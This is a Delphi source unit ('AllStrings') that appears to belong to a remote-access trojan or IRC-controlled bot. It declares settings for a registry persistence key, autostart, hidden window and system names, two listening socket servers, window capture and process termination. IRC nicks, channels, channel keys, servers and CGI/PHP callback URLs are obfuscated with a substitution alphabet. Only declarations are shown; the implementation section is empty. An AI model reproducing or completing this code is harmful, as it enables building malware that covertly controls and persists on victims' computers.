   unit AllStrings;

   interface
   uses windows, messages, winsock, pngimage, pnglang, pngzlib;

   Const
    string_slash : string = '/';
    string_dot : string = '.';
    string_underline : string = '_';
    string_null : string = '';
    string_klaff : string = '''';
    string_startreg : string = 'SOFTWARE\Microsoft\Denial';
    string_regval : string = '\REGVAL.LST';
    string_regkey : string = '\REGKEY.LST';
    string_allstar : string = '*.*';
    string_files: string = '\FILES.LST';
    string_kewlon : string = ';';
    string_kowlon : string = ':';
    string_dollar : string = '$';
    string_sfour : string = '¤';

    FILE_ATTRIBUTE_READONLY             = $00000001;
    FILE_ATTRIBUTE_HIDDEN               = $00000002;
    FILE_ATTRIBUTE_SYSTEM               = $00000004;
    FILE_ATTRIBUTE_ARCHIVE              = $00000020;
    FILE_ATTRIBUTE_DIRECTORY            = $00000010;
    FILE_ATTRIBUTE_NORMAL               = $00000080;
    FILE_ATTRIBUTE_TEMPORARY            = $00000100;
    FILE_ATTRIBUTE_COMPRESSED           = $00000800;
    FILE_ATTRIBUTE_OFFLINE              = $00001000;

    CM_EXIT = WM_USER + $1000;
    PROCESS_TERMINATE = $0001;
    SERVERCLASS1 = '0x77#';                   // Serverclass name 1, registering server 1
    SERVERCLASS2 = '0x76#';                   // Serverclass name 2, registering server 2
    BUFLEN = 65536;                           // set max nr of BUF
    SM_CONNECT = WM_USER + 156;               // declare SM_CONNECT for server part
    SM_SOCKET  = WM_USER + 157;               // declare SM_SOCKET
    ABC2 = 'XTPKGCyvrnkhdaA73jfb840VRNJHDzwtpmigc 61YUQMIEBxusqole95ZWSOLF2&';
    ABC1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 |';

    I_NICK1 : STRING = 'in1=TAbe                                    ';  // 20 bytes
    I_NICK2 : STRING = 'in2=TAb9                                    ';  // 20 bytes
    I_CHAN1 : STRING = 'ic1=#bGfb                                   ';  // 20 bytes
    I_CHAN2 : STRING = 'ic2=#bGfb9                                  ';  // 20 bytes
    I_CKEY1 : STRING = 'ik1=kGRe                                    ';  // 20 bytes
    I_CKEY2 : STRING = 'ik2=kGR9                                    ';  // 20 bytes
    I_MAST1 : STRING = 'im1=                                        ';  // 20 bytes
    I_MAST2 : STRING = 'im2=                                        ';  // 20 bytes
    I_SERV1 : STRING = 'is1=rjP.RA.PAd                              ';  // 20 bytes
    I_SERV2 : STRING = 'is2=rjP.RX.PAd                              ';  // 20 bytes
    S_PASSW : STRING = 'pas=                    '; // 20 bytes
    S_PORT1 : STRING = 'pr1=9LSZ '; // 8 bytes
    S_PORT2 : STRING = 'pr2=9LSW '; // 8 bytes
    S_START : STRING = 'str=Z'; // 1 bytes
   // INJ1    : STRING = 'in1=                                        ';  // 20 bytes
   // INJ2    : STRING = 'in2=                                        ';  // 20 bytes
    S_REGKEY: STRING = 'key=                                        ';  // 20 bytes
    S_RVALUE: STRING = 'val=                                        ';  // 20 bytes
    S_REGWAY: STRING = 'way=                                                                                ';  // 40 bytes
    S_WNAME : STRING = 'win=                                        ';  // 20 bytes
    S_SNAME : STRING = 'sys=                                        ';  // 20 bytes
    S_CGI   : STRING = 'cgi=vbb7://Pyr?RA                           ';  // 20 bytes
    S_PHP   : STRING = 'php=vbb7://7v7?RA                           ';  // 20 bytes

   var
    PngObject              : TPngObject;
    CaptureWindow          : dword;
    SENDING                : BOOLEAN;

    WINS                   :ARRAY[0..300]OF RECORD NAME:STRING;
    WND                    :HWND;
    END;
    WCNT                   :INTEGER;
    BUF                    : ARRAY[0..BUFLEN-1]OF CHAR;
    INST2                  : HWND;
    DIRFILE                : TEXTFILE;
    DIRPATH                : STRING;
    FILSIZZE               : INTEGER;

    REMOTESOCKADDR1        : PSOCKADDR;
    REMOTESOCKADDRLEN1     : PINTEGER;
    MAINWIN1               : HWND;
    MSG1                   : TMSG;
    WSDATA1                : WSADATA;
    BSIZ1                  : LONGINT;
    CONSERVER1             : TSOCKET;
    SOCKETREADISCALLER1    : BOOLEAN;
    CONNECTED1             : BOOLEAN;
    BUF1                   : ARRAY[0..BUFLEN-1]OF CHAR;
    WCLASS1                : TWNDCLASS;
    ASOCKADDR_IN1          : SOCKADDR_IN;
    SERVER1                : TSOCKET;
    INST1                  : HWND;

    // SERVER 2 PARTS :::::: DONT MODIFY NAMES
    REMOTESOCKADDR2        : PSOCKADDR;
    REMOTESOCKADDRLEN2     : PINTEGER;
    MAINWIN2               : HWND;
    MSG2                   : TMSG;
    WSDATA2                : WSADATA;
    BSIZ2                  : LONGINT;
    CONSERVER2             : TSOCKET;
    SOCKETREADISCALLER2    : BOOLEAN;
    CONNECTED2             : BOOLEAN;
    BUF2                   : ARRAY[0..BUFLEN-1]OF CHAR;
    WCLASS2                : TWNDCLASS;
    ASOCKADDR_IN2          : SOCKADDR_IN;
    SERVER2                : TSOCKET;

    SERV_TRAFFICP          : STRING;
    SERV_TRANSP            : STRING;
    SERV_AUTOSTART         : STRING;
    SERV_REGKEY            : STRING;
    SERV_REGVALUE          : STRING;
    SERV_REGWAY            : STRING;
    SERV_WINNAME           : STRING;
    SERV_SYSNAME           : STRING;
    SERV_CGI               : STRING;
    SERV_PHP               : STRING;
    PASSWORD               : STRING;
    IRC_NICK1              : STRING;
    IRC_NICK2              : STRING;
    IRC_CHAN1              : STRING;
    IRC_CHAN2              : STRING;
    IRC_SERV1              : STRING;
    IRC_SERV2              : STRING;
    IRC_CKEY1              : STRING;
    IRC_CKEY2              : STRING;
    IRC_MASTER1            : STRING;
    IRC_MASTER2            : STRING;
    A,DUMMY                : DWORD;
    DIR                    : ARRAY[0..BUFLEN-1]OF CHAR;

   implementation

   end.

